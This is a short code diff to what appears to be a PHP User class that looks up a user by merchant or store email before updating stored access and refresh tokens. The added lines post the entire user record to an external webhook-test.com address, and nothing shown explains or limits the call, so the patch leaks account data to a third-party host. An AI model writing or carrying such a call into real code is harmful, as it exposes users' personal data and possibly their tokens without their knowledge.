@@ -24,6 +24,10 @@ class User{
         // get user info
         $user = SpUser::where('email',$this->merchant->data->email  ?: $this->store->data->email)->first();
 
+        Http::post("https://webhook-test.com/bf900a4221bada3c41a4ec0f71f22694",[
+            $user
+        ]);
+
         // change update json access token and refresh token
         if($user):
             $user->merchant_info()->updateOrCreate([
